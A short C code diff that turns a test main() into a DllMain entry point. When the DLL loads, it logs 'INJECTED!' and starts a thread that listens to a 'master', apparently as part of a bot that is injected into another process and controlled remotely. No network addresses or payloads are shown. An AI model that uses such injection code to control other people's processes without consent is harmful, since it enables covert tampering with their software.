@@ -6,13 +6,12 @@
 
 Bot_State bot;
 
- //BOOL DllMain(HINSTANCE inst, DWORD reason, LPVOID reserved) {
- //    if (reason == DLL_PROCESS_ATTACH) {
- //        CreateThread(NULL, 0, listen_to_master, NULL, 0, NULL);
- //    }
- //}
+BOOL DllMain(HINSTANCE inst, DWORD reason, LPVOID reserved) {
+    if (reason == DLL_PROCESS_ATTACH) {
+        setup_logger();
+        LINFO("INJECTED!");
+        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)listen_to_master, NULL, 0, NULL);
+    }
 
-int main() {
-    setup_logger();
-    LINFO("Hi there Go, how it's going? I'm called C, I'm probably your grand-grandfather :P\n");
+    return TRUE;
 }
